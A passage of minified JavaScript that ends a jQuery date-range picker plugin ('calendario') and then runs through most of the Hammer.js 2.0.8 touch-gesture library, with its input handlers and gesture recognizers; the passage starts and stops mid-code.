                this.container.find(".calendario-calendars").off("keydown.calendario").on("keydown.calendario", e),
                this.timepickers.find(".calendario-timepicker-ampm").off("keydown.calendario").on("keydown.calendario", function(e) {
                    var t = e.which ? e.which : e.keyCode
                      , n = e.target || e.currentTarget
                      , i = g(n).parent().hasClass("calendario-timepicker-end");
                    switch (t) {
                    case 38:
                    case 40:
                        return g(n).children(":not(.calendario-ampm-selected)").click(),
                        !1;
                    case 9:
                        if (i && 0 == e.shiftKey) {
                            var a = g(n).closest(".calendario-container").data("calendario");
                            a && (a.globals.skipTabKeyOnInput = !0,
                            a.hideDropdown(),
                            a.$elem.focus().trigger(g.Event("keydown.calendario", {
                                keyCode: 9,
                                which: 9
                            })))
                        }
                    }
                    return !0
                }),
                this.timepickers.find(".calendario-timepicker-minutes-wrapper").off("keydown.calendario").on("keydown.calendario", function(e) {
                    var t = e.which ? e.which : e.keyCode
                      , n = e.target || e.currentTarget;
                    switch (t) {
                    case 38:
                        return g(n).siblings(".calendario-timepicker-minute-arrows").find(".calendario-timepicker-minutes-up").click(),
                        !1;
                    case 40:
                        return g(n).siblings(".calendario-timepicker-minute-arrows").find(".calendario-timepicker-minutes-down").click(),
                        !1
                    }
                    return !0
                }),
                this.timepickers.find(".calendario-timepicker-hours-wrapper").off("keydown.calendario").on("keydown.calendario", function(e) {
                    var t = e.which ? e.which : e.keyCode
                      , n = e.target || e.currentTarget;
                    switch (t) {
                    case 38:
                        return g(n).siblings(".calendario-timepicker-hour-arrows").find(".calendario-timepicker-hours-up").click(),
                        !1;
                    case 40:
                        return g(n).siblings(".calendario-timepicker-hour-arrows").find(".calendario-timepicker-hours-down").click(),
                        !1
                    }
                    return !0
                })
            }
        },
        destroy: function() {
            this.config.onBeforeDestroy(this) && (this.config.inline ? (this.input.remove(),
            this.globals.isMobile ? this.$elem.unwrap(".calendario-container-mobile") : this.$elem.unwrap(".calendario-container"),
            this.elem.type = "text") : this.container.remove(),
            g(o).off(this.globals.documentEvent),
            this.$elem.removeData("calendario"),
            this.config.ondestroy(this))
        },
        fixDateTime: function(e) {
            return null != e && 0 == moment.isMoment(e) && (e = "string" == typeof e ? moment(e, this.config.format).locale(this.config.locale) : moment(e).locale(this.config.locale)),
            e
        },
        checkMobile: function() {
            return r.matchMedia("only screen and (max-width: " + this.config.mobileBreakpoint + "px)").matches
        },
        checkTouch: function() {
            var e = " -webkit- -moz- -o- -ms- ".split(" ");
            if ("ontouchstart"in r || r.DocumentTouch && o instanceof DocumentTouch)
                return !0;
            var t = ["(", e.join("touch-enabled),("), "heartz", ")"].join("");
            return r.matchMedia(t).matches
        },
        setStart: function(e) {
            var t = this.fixDateTime(e);
            !1 === this.isDisabled(t) && moment(t).isValid() && (this.config.startDate = moment(t),
            this.config.singleDate && (this.config.endDate = moment(t)),
            this.refreshValues())
        },
        setEnd: function(e) {
            var t = this.fixDateTime(e);
            !1 === this.isDisabled(t) && moment(t).isValid() && (this.config.endDate = moment(t),
            this.refreshValues())
        },
        setMinDate: function(e) {
            var t = this.fixDateTime(e);
            moment(t).isValid() && (this.config.minDate = moment(t),
            this.refreshValues())
        },
        setMaxDate: function(e) {
            var t = this.fixDateTime(e);
            moment(t).isValid() && (this.config.maxDate = moment(t),
            this.refreshValues())
        },
        setDisplayDate: function(e) {
            var t = this.fixDateTime(e);
            moment(t).isValid() && (this.globals.currentDate = moment(t),
            this.reDrawCalendars())
        },
        refreshValues: function() {
            var e = this.globals.delayInputUpdate;
            this.globals.delayInputUpdate = !1,
            this.validateDates(),
            this.updateTimePickerDisplay(),
            this.updateInput(),
            this.globals.delayInputUpdate = e,
            this.reDrawCells()
        }
    }).defaults,
    g.fn.calendario = function(e) {
        return this.each(function() {
            null == g(this).data("calendario") && new t(this,e).init()
        })
    }
    ,
    "function" != typeof moment.fn.middleOfDay && (moment.fn.middleOfDay = function() {
        return this.hours(12).minutes(0).seconds(0),
        this
    }
    ,
    moment.fn.startOfMonth = function() {
        return this.middleOfDay().date(1),
        this
    }
    )
}(jQuery, window, document),
function(s, o, v) {
    "use strict";
    var r, l = ["", "webkit", "Moz", "MS", "ms", "o"], e = o.createElement("div"), n = "function", d = Math.round, M = Math.abs, L = Date.now;
    function u(e, t, n) {
        return setTimeout(f(e, n), t)
    }
    function i(e, t, n) {
        return Array.isArray(e) && (c(e, n[t], n),
        1)
    }
    function c(e, t, n) {
        var i;
        if (e)
            if (e.forEach)
                e.forEach(t, n);
            else if (e.length !== v)
                for (i = 0; i < e.length; )
                    t.call(n, e[i], i, e),
                    i++;
            else
                for (i in e)
                    e.hasOwnProperty(i) && t.call(n, e[i], i, e)
    }
    function t(i, e, t) {
        var a = "DEPRECATED METHOD: " + e + "\n" + t + " AT \n";
        return function() {
            var e = new Error("get-stack-trace")
              , t = e && e.stack ? e.stack.replace(/^[^\(]+?[\n$]/gm, "").replace(/^\s+at\s+/gm, "").replace(/^Object.<anonymous>\s*\(/gm, "{anonymous}()@") : "Unknown Stack Trace"
              , n = s.console && (s.console.warn || s.console.log);
            return n && n.call(s.console, a, t),
            i.apply(this, arguments)
        }
    }
    r = "function" != typeof Object.assign ? function(e) {
        if (e === v || null === e)
            throw new TypeError("Cannot convert undefined or null to object");
        for (var t = Object(e), n = 1; n < arguments.length; n++) {
            var i = arguments[n];
            if (i !== v && null !== i)
                for (var a in i)
                    i.hasOwnProperty(a) && (t[a] = i[a])
        }
        return t
    }
    : Object.assign;
    var a = t(function(e, t, n) {
        for (var i = Object.keys(t), a = 0; a < i.length; )
            (!n || n && e[i[a]] === v) && (e[i[a]] = t[i[a]]),
            a++;
        return e
    }, "extend", "Use `assign`.")
      , h = t(function(e, t) {
        return a(e, t, !0)
    }, "merge", "Use `assign`.");
    function m(e, t, n) {
        var i, a = t.prototype;
        (i = e.prototype = Object.create(a)).constructor = e,
        i._super = a,
        n && r(i, n)
    }
    function f(e, t) {
        return function() {
            return e.apply(t, arguments)
        }
    }
    function p(e, t) {
        return typeof e == n ? e.apply(t && t[0] || v, t) : e
    }
    function _(e, t) {
        return e === v ? t : e
    }
    function g(t, e, n) {
        c(D(e), function(e) {
            t.addEventListener(e, n, !1)
        })
    }
    function y(t, e, n) {
        c(D(e), function(e) {
            t.removeEventListener(e, n, !1)
        })
    }
    function b(e, t) {
        for (; e; ) {
            if (e == t)
                return !0;
            e = e.parentNode
        }
        return !1
    }
    function k(e, t) {
        return -1 < e.indexOf(t)
    }
    function D(e) {
        return e.trim().split(/\s+/g)
    }
    function Y(e, t, n) {
        if (e.indexOf && !n)
            return e.indexOf(t);
        for (var i = 0; i < e.length; ) {
            if (n && e[i][n] == t || !n && e[i] === t)
                return i;
            i++
        }
        return -1
    }
    function w(e) {
        return Array.prototype.slice.call(e, 0)
    }
    function T(e, n, t) {
        for (var i = [], a = [], s = 0; s < e.length; ) {
            var r = n ? e[s][n] : e[s];
            Y(a, r) < 0 && i.push(e[s]),
            a[s] = r,
            s++
        }
        return t && (i = n ? i.sort(function(e, t) {
            return e[n] > t[n]
        }) : i.sort()),
        i
    }
    function S(e, t) {
        for (var n, i, a = t[0].toUpperCase() + t.slice(1), s = 0; s < l.length; ) {
            if ((i = (n = l[s]) ? n + a : t)in e)
                return i;
            s++
        }
        return v
    }
    var x = 1;
    function H(e) {
        var t = e.ownerDocument || e;
        return t.defaultView || t.parentWindow || s
    }
    var E = "ontouchstart"in s
      , j = S(s, "PointerEvent") !== v
      , C = E && /mobile|tablet|ip(ad|hone|od)|android/i.test(navigator.userAgent)
      , A = "touch"
      , P = 25
      , O = 1
      , N = 4
      , F = 8
      , W = 1
      , I = 2
      , z = 4
      , R = 8
      , $ = 16
      , B = I | z
      , q = R | $
      , U = B | q
      , J = ["x", "y"]
      , V = ["clientX", "clientY"];
    function G(t, e) {
        var n = this;
        this.manager = t,
        this.callback = e,
        this.element = t.element,
        this.target = t.options.inputTarget,
        this.domHandler = function(e) {
            p(t.options.enable, [t]) && n.handler(e)
        }
        ,
        this.init()
    }
    function X(e, t, n) {
        var i = n.pointers.length
          , a = n.changedPointers.length
          , s = t & O && i - a == 0
          , r = t & (N | F) && i - a == 0;
        n.isFirst = !!s,
        n.isFinal = !!r,
        s && (e.session = {}),
        n.eventType = t,
        function(e, t) {
            var n = e.session
              , i = t.pointers
              , a = i.length;
            n.firstInput || (n.firstInput = K(t)),
            1 < a && !n.firstMultiple ? n.firstMultiple = K(t) : 1 === a && (n.firstMultiple = !1);
            var s, r, o, l, d, u, c = n.firstInput, h = n.firstMultiple, m = h ? h.center : c.center, f = t.center = Q(i);
            t.timeStamp = L(),
            t.deltaTime = t.timeStamp - c.timeStamp,
            t.angle = ne(m, f),
            t.distance = te(m, f),
            s = n,
            o = (r = t).center,
            l = s.offsetDelta || {},
            d = s.prevDelta || {},
            u = s.prevInput || {},
            r.eventType !== O && u.eventType !== N || (d = s.prevDelta = {
                x: u.deltaX || 0,
                y: u.deltaY || 0
            },
            l = s.offsetDelta = {
                x: o.x,
                y: o.y
            }),
            r.deltaX = d.x + (o.x - l.x),
            r.deltaY = d.y + (o.y - l.y),
            t.offsetDirection = ee(t.deltaX, t.deltaY);
            var p, _, g = Z(t.deltaTime, t.deltaX, t.deltaY);
            t.overallVelocityX = g.x,
            t.overallVelocityY = g.y,
            t.overallVelocity = M(g.x) > M(g.y) ? g.x : g.y,
            t.scale = h ? (_ = h.pointers,
            te(i[0], i[1], V) / te(_[0], _[1], V)) : 1,
            t.rotation = h ? (p = h.pointers,
            ne(i[1], i[0], V) + ne(p[1], p[0], V)) : 0,
            t.maxPointers = !n.prevInput || t.pointers.length > n.prevInput.maxPointers ? t.pointers.length : n.prevInput.maxPointers,
            function(e, t) {
                var n, i, a, s, r = e.lastInterval || t, o = t.timeStamp - r.timeStamp;
                if (t.eventType != F && (P < o || r.velocity === v)) {
                    var l = t.deltaX - r.deltaX
                      , d = t.deltaY - r.deltaY
                      , u = Z(o, l, d);
                    i = u.x,
                    a = u.y,
                    n = M(u.x) > M(u.y) ? u.x : u.y,
                    s = ee(l, d),
                    e.lastInterval = t
                } else
                    n = r.velocity,
                    i = r.velocityX,
                    a = r.velocityY,
                    s = r.direction;
                t.velocity = n,
                t.velocityX = i,
                t.velocityY = a,
                t.direction = s
            }(n, t);
            var y = e.element;
            b(t.srcEvent.target, y) && (y = t.srcEvent.target),
            t.target = y
        }(e, n),
        e.emit("hammer.input", n),
        e.recognize(n),
        e.session.prevInput = n
    }
    function K(e) {
        for (var t = [], n = 0; n < e.pointers.length; )
            t[n] = {
                clientX: d(e.pointers[n].clientX),
                clientY: d(e.pointers[n].clientY)
            },
            n++;
        return {
            timeStamp: L(),
            pointers: t,
            center: Q(t),
            deltaX: e.deltaX,
            deltaY: e.deltaY
        }
    }
    function Q(e) {
        var t = e.length;
        if (1 === t)
            return {
                x: d(e[0].clientX),
                y: d(e[0].clientY)
            };
        for (var n = 0, i = 0, a = 0; a < t; )
            n += e[a].clientX,
            i += e[a].clientY,
            a++;
        return {
            x: d(n / t),
            y: d(i / t)
        }
    }
    function Z(e, t, n) {
        return {
            x: t / e || 0,
            y: n / e || 0
        }
    }
    function ee(e, t) {
        return e === t ? W : M(e) >= M(t) ? e < 0 ? I : z : t < 0 ? R : $
    }
    function te(e, t, n) {
        var i = t[(n = n || J)[0]] - e[n[0]]
          , a = t[n[1]] - e[n[1]];
        return Math.sqrt(i * i + a * a)
    }
    function ne(e, t, n) {
        var i = t[(n = n || J)[0]] - e[n[0]]
          , a = t[n[1]] - e[n[1]];
        return 180 * Math.atan2(a, i) / Math.PI
    }
    G.prototype = {
        handler: function() {},
        init: function() {
            this.evEl && g(this.element, this.evEl, this.domHandler),
            this.evTarget && g(this.target, this.evTarget, this.domHandler),
            this.evWin && g(H(this.element), this.evWin, this.domHandler)
        },
        destroy: function() {
            this.evEl && y(this.element, this.evEl, this.domHandler),
            this.evTarget && y(this.target, this.evTarget, this.domHandler),
            this.evWin && y(H(this.element), this.evWin, this.domHandler)
        }
    };
    var ie = {
        mousedown: O,
        mousemove: 2,
        mouseup: N
    }
      , ae = "mousedown"
      , se = "mousemove mouseup";
    function re() {
        this.evEl = ae,
        this.evWin = se,
        this.pressed = !1,
        G.apply(this, arguments)
    }
    m(re, G, {
        handler: function(e) {
            var t = ie[e.type];
            t & O && 0 === e.button && (this.pressed = !0),
            2 & t && 1 !== e.which && (t = N),
            this.pressed && (t & N && (this.pressed = !1),
            this.callback(this.manager, t, {
                pointers: [e],
                changedPointers: [e],
                pointerType: "mouse",
                srcEvent: e
            }))
        }
    });
    var oe = {
        pointerdown: O,
        pointermove: 2,
        pointerup: N,
        pointercancel: F,
        pointerout: F
    }
      , le = {
        2: A,
        3: "pen",
        4: "mouse",
        5: "kinect"
    }
      , de = "pointerdown"
      , ue = "pointermove pointerup pointercancel";
    function ce() {
        this.evEl = de,
        this.evWin = ue,
        G.apply(this, arguments),
        this.store = this.manager.session.pointerEvents = []
    }
    s.MSPointerEvent && !s.PointerEvent && (de = "MSPointerDown",
    ue = "MSPointerMove MSPointerUp MSPointerCancel"),
    m(ce, G, {
        handler: function(e) {
            var t = this.store
              , n = !1
              , i = e.type.toLowerCase().replace("ms", "")
              , a = oe[i]
              , s = le[e.pointerType] || e.pointerType
              , r = s == A
              , o = Y(t, e.pointerId, "pointerId");
            a & O && (0 === e.button || r) ? o < 0 && (t.push(e),
            o = t.length - 1) : a & (N | F) && (n = !0),
            o < 0 || (t[o] = e,
            this.callback(this.manager, a, {
                pointers: t,
                changedPointers: [e],
                pointerType: s,
                srcEvent: e
            }),
            n && t.splice(o, 1))
        }
    });
    var he = {
        touchstart: O,
        touchmove: 2,
        touchend: N,
        touchcancel: F
    };
    function me() {
        this.evTarget = "touchstart",
        this.evWin = "touchstart touchmove touchend touchcancel",
        this.started = !1,
        G.apply(this, arguments)
    }
    m(me, G, {
        handler: function(e) {
            var t = he[e.type];
            if (t === O && (this.started = !0),
            this.started) {
                var n = function(e, t) {
                    var n = w(e.touches)
                      , i = w(e.changedTouches);
                    return t & (N | F) && (n = T(n.concat(i), "identifier", !0)),
                    [n, i]
                }
                .call(this, e, t);
                t & (N | F) && n[0].length - n[1].length == 0 && (this.started = !1),
                this.callback(this.manager, t, {
                    pointers: n[0],
                    changedPointers: n[1],
                    pointerType: A,
                    srcEvent: e
                })
            }
        }
    });
    var fe = {
        touchstart: O,
        touchmove: 2,
        touchend: N,
        touchcancel: F
    }
      , pe = "touchstart touchmove touchend touchcancel";
    function _e() {
        this.evTarget = pe,
        this.targetIds = {},
        G.apply(this, arguments)
    }
    m(_e, G, {
        handler: function(e) {
            var t = fe[e.type]
              , n = function(e, t) {
                var n = w(e.touches)
                  , i = this.targetIds;
                if (t & (2 | O) && 1 === n.length)
                    return i[n[0].identifier] = !0,
                    [n, n];
                var a, s, r = w(e.changedTouches), o = [], l = this.target;
                if (s = n.filter(function(e) {
                    return b(e.target, l)
                }),
                t === O)
                    for (a = 0; a < s.length; )
                        i[s[a].identifier] = !0,
                        a++;
                for (a = 0; a < r.length; )
                    i[r[a].identifier] && o.push(r[a]),
                    t & (N | F) && delete i[r[a].identifier],
                    a++;
                return o.length ? [T(s.concat(o), "identifier", !0), o] : void 0
            }
            .call(this, e, t);
            n && this.callback(this.manager, t, {
                pointers: n[0],
                changedPointers: n[1],
                pointerType: A,
                srcEvent: e
            })
        }
    });
    function ge() {
        G.apply(this, arguments);
        var e = f(this.handler, this);
        this.touch = new _e(this.manager,e),
        this.mouse = new re(this.manager,e),
        this.primaryTouch = null,
        this.lastTouches = []
    }
    function ye(e) {
        var t = e.changedPointers[0];
        if (t.identifier === this.primaryTouch) {
            var n = {
                x: t.clientX,
                y: t.clientY
            };
            this.lastTouches.push(n);
            var i = this.lastTouches;
            setTimeout(function() {
                var e = i.indexOf(n);
                -1 < e && i.splice(e, 1)
            }, 2500)
        }
    }
    m(ge, G, {
        handler: function(e, t, n) {
            var i = n.pointerType == A
              , a = "mouse" == n.pointerType;
            if (!(a && n.sourceCapabilities && n.sourceCapabilities.firesTouchEvents)) {
                if (i)
                    (function(e, t) {
                        e & O ? (this.primaryTouch = t.changedPointers[0].identifier,
                        ye.call(this, t)) : e & (N | F) && ye.call(this, t)
                    }
                    ).call(this, t, n);
                else if (a && function(e) {
                    for (var t = e.srcEvent.clientX, n = e.srcEvent.clientY, i = 0; i < this.lastTouches.length; i++) {
                        var a = this.lastTouches[i]
                          , s = Math.abs(t - a.x)
                          , r = Math.abs(n - a.y);
                        if (s <= 25 && r <= 25)
                            return !0
                    }
                    return !1
                }
                .call(this, n))
                    return;
                this.callback(e, t, n)
            }
        },
        destroy: function() {
            this.touch.destroy(),
            this.mouse.destroy()
        }
    });
    var ve = S(e.style, "touchAction")
      , Me = ve !== v
      , Le = "manipulation"
      , be = "none"
      , ke = "pan-x"
      , De = "pan-y"
      , Ye = function() {
        if (!Me)
            return !1;
        var t = {}
          , n = s.CSS && s.CSS.supports;
        return ["auto", "manipulation", "pan-y", "pan-x", "pan-x pan-y", "none"].forEach(function(e) {
            t[e] = !n || s.CSS.supports("touch-action", e)
        }),
        t
    }();
    function we(e, t) {
        this.manager = e,
        this.set(t)
    }
    we.prototype = {
        set: function(e) {
            "compute" == e && (e = this.compute()),
            Me && this.manager.element.style && Ye[e] && (this.manager.element.style[ve] = e),
            this.actions = e.toLowerCase().trim()
        },
        update: function() {
            this.set(this.manager.options.touchAction)
        },
        compute: function() {
            var t = [];
            return c(this.manager.recognizers, function(e) {
                p(e.options.enable, [e]) && (t = t.concat(e.getTouchAction()))
            }),
            function(e) {
                if (k(e, be))
                    return be;
                var t = k(e, ke)
                  , n = k(e, De);
                return t && n ? be : t || n ? t ? ke : De : k(e, Le) ? Le : "auto"
            }(t.join(" "))
        },
        preventDefaults: function(e) {
            var t = e.srcEvent
              , n = e.offsetDirection;
            if (this.manager.session.prevented)
                t.preventDefault();
            else {
                var i = this.actions
                  , a = k(i, be) && !Ye.none
                  , s = k(i, De) && !Ye[De]
                  , r = k(i, ke) && !Ye[ke];
                if (a) {
                    var o = 1 === e.pointers.length
                      , l = e.distance < 2
                      , d = e.deltaTime < 250;
                    if (o && l && d)
                        return
                }
                if (!r || !s)
                    return a || s && n & B || r && n & q ? this.preventSrc(t) : void 0
            }
        },
        preventSrc: function(e) {
            this.manager.session.prevented = !0,
            e.preventDefault()
        }
    };
    var Te = 1;
    function Se(e) {
        this.options = r({}, this.defaults, e || {}),
        this.id = x++,
        this.manager = null,
        this.options.enable = _(this.options.enable, !0),
        this.state = Te,
        this.simultaneous = {},
        this.requireFail = []
    }
    function xe(e) {
        return 16 & e ? "cancel" : 8 & e ? "end" : 4 & e ? "move" : 2 & e ? "start" : ""
    }
    function He(e) {
        return e == $ ? "down" : e == R ? "up" : e == I ? "left" : e == z ? "right" : ""
    }
    function Ee(e, t) {
        var n = t.manager;
        return n ? n.get(e) : e
    }
    function je() {
        Se.apply(this, arguments)
    }
    function Ce() {
        je.apply(this, arguments),
        this.pX = null,
        this.pY = null
    }
    function Ae() {
        je.apply(this, arguments)
    }
    function Pe() {
        Se.apply(this, arguments),
        this._timer = null,
        this._input = null
    }
    function Oe() {
        je.apply(this, arguments)
    }
    function Ne() {
        je.apply(this, arguments)
    }
    function Fe() {
        Se.apply(this, arguments),
        this.pTime = !1,
        this.pCenter = !1,
        this._timer = null,
        this._input = null,
        this.count = 0
    }
    function We(e, t) {
        return (t = t || {}).recognizers = _(t.recognizers, We.defaults.preset),
        new Ie(e,t)
    }
    function Ie(e, t) {
        this.options = r({}, We.defaults, t || {}),
        this.options.inputTarget = this.options.inputTarget || e,
        this.handlers = {},
        this.session = {},
        this.recognizers = [],
        this.oldCssProps = {},
        this.element = e,
        this.input = new (this.options.inputClass || (j ? ce : C ? _e : E ? ge : re))(this,X),
        this.touchAction = new we(this,this.options.touchAction),
        ze(this, !0),
        c(this.options.recognizers, function(e) {
            var t = this.add(new e[0](e[1]));
            e[2] && t.recognizeWith(e[2]),
            e[3] && t.requireFailure(e[3])
        }, this)
    }
    function ze(n, i) {
        var a, s = n.element;
        s.style && (c(n.options.cssProps, function(e, t) {
            a = S(s.style, t),
            i ? (n.oldCssProps[a] = s.style[a],
            s.style[a] = e) : s.style[a] = n.oldCssProps[a] || ""
        }),
        i || (n.oldCssProps = {}))
    }
    Se.prototype = {
        defaults: {},
        set: function(e) {
            return r(this.options, e),
            this.manager && this.manager.touchAction.update(),
            this
        },
        recognizeWith: function(e) {
            if (i(e, "recognizeWith", this))
                return this;
            var t = this.simultaneous;
            return t[(e = Ee(e, this)).id] || (t[e.id] = e).recognizeWith(this),
            this
        },
        dropRecognizeWith: function(e) {
            return i(e, "dropRecognizeWith", this) || (e = Ee(e, this),
            delete this.simultaneous[e.id]),
            this
        },
        requireFailure: function(e) {
            if (i(e, "requireFailure", this))
                return this;
            var t = this.requireFail;
            return -1 === Y(t, e = Ee(e, this)) && (t.push(e),
            e.requireFailure(this)),
            this
        },
        dropRequireFailure: function(e) {
            if (i(e, "dropRequireFailure", this))
                return this;
            e = Ee(e, this);
            var t = Y(this.requireFail, e);
            return -1 < t && this.requireFail.splice(t, 1),
            this
        },
        hasRequireFailures: function() {
            return 0 < this.requireFail.length
        },
        canRecognizeWith: function(e) {
            return !!this.simultaneous[e.id]
        },
        emit: function(t) {
            var n = this
              , e = this.state;
            function i(e) {
                n.manager.emit(e, t)
            }
            e < 8 && i(n.options.event + xe(e)),
            i(n.options.event),
            t.additionalEvent && i(t.additionalEvent),
            8 <= e && i(n.options.event + xe(e))
        },
        tryEmit: function(e) {
            if (this.canEmit())
                return this.emit(e);
            this.state = 32
        },
        canEmit: function() {
            for (var e = 0; e < this.requireFail.length; ) {
                if (!(this.requireFail[e].state & (32 | Te)))
                    return !1;
                e++
            }
            return !0
        },
        recognize: function(e) {
            var t = r({}, e);
            if (!p(this.options.enable, [this, t]))
                return this.reset(),
                void (this.state = 32);
            56 & this.state && (this.state = Te),
            this.state = this.process(t),
            30 & this.state && this.tryEmit(t)
        },
        process: function(e) {},
        getTouchAction: function() {},
        reset: function() {}
    },
    m(je, Se, {
        defaults: {
            pointers: 1
        },
        attrTest: function(e) {
            var t = this.options.pointers;
            return 0 === t || e.pointers.length === t
        },
        process: function(e) {
            var t = this.state
              , n = e.eventType
              , i = 6 & t
              , a = this.attrTest(e);
            return i && (n & F || !a) ? 16 | t : i || a ? n & N ? 8 | t : 2 & t ? 4 | t : 2 : 32
        }
    }),
    m(Ce, je, {
        defaults: {
            event: "pan",
            threshold: 10,
            pointers: 1,
            direction: U
        },
        getTouchAction: function() {
            var e = this.options.direction
              , t = [];
            return e & B && t.push(De),
            e & q && t.push(ke),
            t
        },
        directionTest: function(e) {
            var t = this.options
              , n = !0
              , i = e.distance
              , a = e.direction
              , s = e.deltaX
              , r = e.deltaY;
            return a & t.direction || (i = t.direction & B ? (a = 0 === s ? W : s < 0 ? I : z,
            n = s != this.pX,
            Math.abs(e.deltaX)) : (a = 0 === r ? W : r < 0 ? R : $,
            n = r != this.pY,
            Math.abs(e.deltaY))),
            e.direction = a,
            n && i > t.threshold && a & t.direction
        },
        attrTest: function(e) {
            return je.prototype.attrTest.call(this, e) && (2 & this.state || !(2 & this.state) && this.directionTest(e))
        },
        emit: function(e) {
            this.pX = e.deltaX,
            this.pY = e.deltaY;
            var t = He(e.direction);
            t && (e.additionalEvent = this.options.event + t),
            this._super.emit.call(this, e)
        }
    }),
    m(Ae, je, {
        defaults: {
            event: "pinch",
            threshold: 0,
            pointers: 2
        },
        getTouchAction: function() {
            return [be]
        },
        attrTest: function(e) {
            return this._super.attrTest.call(this, e) && (Math.abs(e.scale - 1) > this.options.threshold || 2 & this.state)
        },
        emit: function(e) {
            if (1 !== e.scale) {
                var t = e.scale < 1 ? "in" : "out";
                e.additionalEvent = this.options.event + t
            }
            this._super.emit.call(this, e)
        }
    }),
    m(Pe, Se, {
        defaults: {
            event: "press",
            pointers: 1,
            time: 251,
            threshold: 9
        },
        getTouchAction: function() {
            return ["auto"]
        },
        process: function(e) {
            var t = this.options
              , n = e.pointers.length === t.pointers
              , i = e.distance < t.threshold
              , a = e.deltaTime > t.time;
            if (this._input = e,
            !i || !n || e.eventType & (N | F) && !a)
                this.reset();
            else if (e.eventType & O)
                this.reset(),
                this._timer = u(function() {
                    this.state = 8,
                    this.tryEmit()
                }, t.time, this);
            else if (e.eventType & N)
                return 8;
            return 32
        },
        reset: function() {
            clearTimeout(this._timer)
        },
        emit: function(e) {
            8 === this.state && (e && e.eventType & N ? this.manager.emit(this.options.event + "up", e) : (this._input.timeStamp = L(),
            this.manager.emit(this.options.event, this._input)))
        }
    }),
    m(Oe, je, {
        defaults: {
            event: "rotate",
            threshold: 0,
            pointers: 2
        },
        getTouchAction: function() {
            return [be]
        },
        attrTest: function(e) {
            return this._super.attrTest.call(this, e) && (Math.abs(e.rotation) > this.options.threshold || 2 & this.state)
        }
    }),
    m(Ne, je, {
        defaults: {
            event: "swipe",
            threshold: 10,
            velocity: .3,
            direction: B | q,
            pointers: 1
        },
        getTouchAction: function() {
            return Ce.prototype.getTouchAction.call(this)
        },
        attrTest: function(e) {
            var t, n = this.options.direction;
            return n & (B | q) ? t = e.overallVelocity : n & B ? t = e.overallVelocityX : n & q && (t = e.overallVelocityY),
            this._super.attrTest.call(this, e) && n & e.offsetDirection && e.distance > this.options.threshold && e.maxPointers == this.options.pointers && M(t) > this.options.velocity && e.eventType & N
        },
        emit: function(e) {
            var t = He(e.offsetDirection);
            t && this.manager.emit(this.options.event + t, e),
            this.manager.emit(this.options.event, e)
        }
    }),
    m(Fe, Se, {
        defaults: {
            event: "tap",
            pointers: 1,
            taps: 1,
            interval: 300,
            time: 250,
            threshold: 9,
            posThreshold: 10
        },
        getTouchAction: function() {
            return [Le]
        },
        process: function(e) {
            var t = this.options
              , n = e.pointers.length === t.pointers
              , i = e.distance < t.threshold
              , a = e.deltaTime < t.time;
            if (this.reset(),
            e.eventType & O && 0 === this.count)
                return this.failTimeout();
            if (i && a && n) {
                if (e.eventType != N)
                    return this.failTimeout();
                var s = !this.pTime || e.timeStamp - this.pTime < t.interval
                  , r = !this.pCenter || te(this.pCenter, e.center) < t.posThreshold;
                if (this.pTime = e.timeStamp,
                this.pCenter = e.center,
                r && s ? this.count += 1 : this.count = 1,
                this._input = e,
                0 == this.count % t.taps)
                    return this.hasRequireFailures() ? (this._timer = u(function() {
                        this.state = 8,
                        this.tryEmit()
                    }, t.interval, this),
                    2) : 8
            }
            return 32
        },
        failTimeout: function() {
            return this._timer = u(function() {
                this.state = 32
            }, this.options.interval, this),
            32
        },
        reset: function() {
            clearTimeout(this._timer)
        },
        emit: function() {
            8 == this.state && (this._input.tapCount = this.count,
            this.manager.emit(this.options.event, this._input))
        }
    }),
    We.VERSION = "2.0.8",
    We.defaults = {
        domEvents: !1,
        touchAction: "compute",
        enable: !0,
        inputTarget: null,
        inputClass: null,
        preset: [[Oe, {
            enable: !1
        }], [Ae, {
            enable: !1
        }, ["rotate"]], [Ne, {
            direction: B
        }], [Ce, {
            direction: B
        }, ["swipe"]], [Fe], [Fe, {
            event: "doubletap",
            taps: 2
        }, ["tap"]], [Pe]],
        cssProps: {
            userSelect: "none",
            touchSelect: "none",
            touchCallout: "none",
            contentZooming: "none",
            userDrag: "none",
            tapHighlightColor: "rgba(0,0,0,0)"
        }
    },
    Ie.prototype = {
        set: function(e) {
            return r(this.options, e),
            e.touchAction && this.touchAction.update(),
            e.inputTarget && (this.input.destroy(),
            this.input.target = e.inputTarget,
            this.input.init()),
            this
        },
        stop: function(e) {
            this.session.stopped = e ? 2 : 1
        },
        recognize: function(e) {
            var t = this.session;
            if (!t.stopped) {
                var n;
                this.touchAction.preventDefaults(e);
                var i = this.recognizers
                  , a = t.curRecognizer;
                (!a || a && 8 & a.state) && (a = t.curRecognizer = null);
                for (var s = 0; s < i.length; )
                    n = i[s],
                    2 === t.stopped || a && n != a && !n.canRecognizeWith(a) ? n.reset() : n.recognize(e),
                    !a && 14 & n.state && (a = t.curRecognizer = n),
                    s++
            }
        },
        get: function(e) {
            if (e instanceof Se)
                return e;
            for (var t = this.recognizers, n = 0; n < t.length; n++)
                if (t[n].options.event == e)
                    return t[n];
            return null
        },
        add: function(e) {
            if (i(e, "add", this))
                return this;
            var t = this.get(e.options.event);
            return t && this.remove(t),
            this.recognizers.push(e),
            (e.manager = this).touchAction.update(),
            e
        },
        remove: function(e) {
            if (i(e, "remove", this))
                return this;
            if (e = this.get(e)) {
                var t = this.recognizers
                  , n = Y(t, e);
                -1 !== n && (t.splice(n, 1),
                this.touchAction.update())
            }
            return this
        },
        on: function(e, t) {
            if (e !== v && t !== v) {
                var n = this.handlers;
                return c(D(e), function(e) {
                    n[e] = n[e] || [],
                    n[e].push(t)
                }),
                this
            }
        },
        off: function(e, t) {
            if (e !== v) {
                var n = this.handlers;
                return c(D(e), function(e) {
                    t ? n[e] && n[e].splice(Y(n[e], t), 1) : delete n[e]
                }),
                this
            }
        },
        emit: function(e, t) {
            var n, i, a;
            this.options.domEvents && (n = e,
            i = t,
            (a = o.createEvent("Event")).initEvent(n, !0, !0),
            (a.gesture = i).target.dispatchEvent(a));
            var s = this.handlers[e] && this.handlers[e].slice();
            if (s && s.length) {
                t.type = e,
                t.preventDefault = function() {
                    t.srcEvent.preventDefault()
                }
                ;
                for (var r = 0; r < s.length; )
                    s[r](t),
                    r++
            }
        },
        destroy: function() {
            this.element && ze(this, !1),
            this.handlers = {},
            this.session = {},
            this.input.destroy(),
            this.element = null
        }
    },
    r(We, {
        INPUT_START: O,
        INPUT_MOVE: 2,
        INPUT_END: N,
        INPUT_CANCEL: F,
        STATE_POSSIBLE: Te,
